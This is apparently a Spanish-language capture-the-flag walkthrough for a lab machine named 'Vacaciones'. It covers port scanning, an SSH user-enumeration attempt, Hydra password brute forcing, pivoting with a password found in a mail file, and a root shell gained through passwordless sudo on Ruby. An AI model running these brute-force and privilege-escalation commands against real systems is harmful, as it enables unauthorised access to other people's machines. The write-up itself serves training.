# Vacaciones

## 1. Reconocimiento de Puertos con Nmap

Iniciamos la auditoría con un escaneo de puertos para identificar servicios y versiones.

```bash
nmap -sC -sV --open <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `22/tcp open ssh OpenSSH 7.6p1 Ubuntu` Versión antigua, potencialmente vulnerable a enumeración de usuarios.
*   `80/tcp open http Apache httpd 2.4.29 ((Ubuntu))`

## 2. Enumeración Web

Al acceder al servicio web, la página principal parece carecer de contenido. Procedemos a inspeccionar el código fuente en busca de comentarios o elementos ocultos.

### 2.1. Pista en el Código Fuente

En el código fuente de la página web, se encuentra un comentario con el siguiente mensaje:

```txt
De : Juan Para: Camilo , te he dejado un correo es importante...
```

Esta pista nos proporciona dos posibles nombres de usuario: **Juan** y **Camilo**. Además, la mención de un "correo importante" sugiere que la información adicional podría estar en el sistema de correo del servidor.

## 3. Enumeración de Usuarios y Ataque SSH 

La versión de OpenSSH (7.6p1) es conocida por una vulnerabilidad de enumeración de usuarios (CVE-2018-15473). Intentamos usar herramientas para explotar esto, pero a veces, en entornos de laboratorio, estos exploits pueden dar falsos positivos o no funcionar como se espera.

### 3.1. Intento de Enumeración con Metasploit (Rabbit Hole)

Aunque la vulnerabilidad existe, el módulo de Metasploit (`auxiliary/scanner/ssh/ssh_enumusers`) puede reportar falsos positivos o no ser efectivo en todas las configuraciones.

```bash
sudo msfdb init && msfconsole
# use auxiliary/scanner/ssh/ssh_enumusers
# set RHOSTS <IP_DEL_OBJETIVO>
# set USER_FILE /path/to/wordlist/unix_users.txt
# run
```

Si el módulo indica "throws false positive results. Aborting.", significa que no es fiable para enumerar usuarios en este caso.

### 3.2. Fuerza Bruta con Hydra

Lanzamos un ataque de diccionario contra el usuario `camilo`.

```bash
hydra -l camilo -P /path/to/wordlist/rockyou.txt ssh://<IP_DEL_OBJETIVO>
```

**Resultado:**

```
[22][ssh] host: <IP_DEL_OBJETIVO>   login: camilo   password: password1
```

Esto nos proporciona la contraseña para el usuario `camilo`: **password1**.

## 4. Acceso Inicial y Movimiento Lateral

### 4.1. Conexión SSH como Camilo

```bash
ssh camilo@<IP_DEL_OBJETIVO>
# Contraseña: password1
```

### 4.2. Búsqueda del "Correo Importante"

La pista web mencionaba un "correo importante". En sistemas Linux, los correos de los usuarios suelen almacenarse en `/var/mail/`. Navegamos a este directorio y buscamos el correo de `camilo`.

```bash
cd /var/mail/
ls
# Vemos el directorio 'camilo'
cd camilo
cat correo.txt
```

**Contenido del Correo:**

```
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

Este correo nos proporciona una nueva contraseña y, lo más importante, una pista sobre otro usuario: **Juan**.

### 4.3. Acceso SSH como Juan

Utilizamos la contraseña descubierta para pivotar al usuario `juan`.

```bash
ssh juan@<IP_DEL_OBJETIVO>
# Contraseña: 2k84dicb
```

## 5. Escalada de Privilegios

Una vez que hemos obtenido acceso SSH como el usuario `juan`, el objetivo es escalar privilegios a `root`.

### 5.1. Verificación de Permisos Sudo

Revisamos los privilegios de superusuario asignados a `juan`.

```bash
sudo -l
```

**Resultado :**
```
User juan may run the following commands on ...: 
	(ALL) NOPASSWD: /usr/bin/ruby
```

El usuario puede ejecutar el intérprete de Ruby como `root` sin contraseña.

### 5.2. Explotación de Ruby (GTFOBins)

`ruby` es un lenguaje de programación que, si se puede ejecutar con `sudo` sin contraseña, puede ser usado para obtener un shell de `root`. Consultamos [GTFOBins](https://gtfobins.github.io/gtfobins/ruby/#sudo) para la técnica específica.

```bash
sudo -u root /usr/bin/ruby -e 'exec "/bin/sh"'
```

- `-e`: Permite ejecutar una línea de código Ruby directamente desde la terminal.
- `exec "/bin/sh"`: Reemplaza el proceso actual con una shell.

El comando `whoami` confirmará que hemos escalado exitosamente a `root`.

```bash
whoami
# root
```
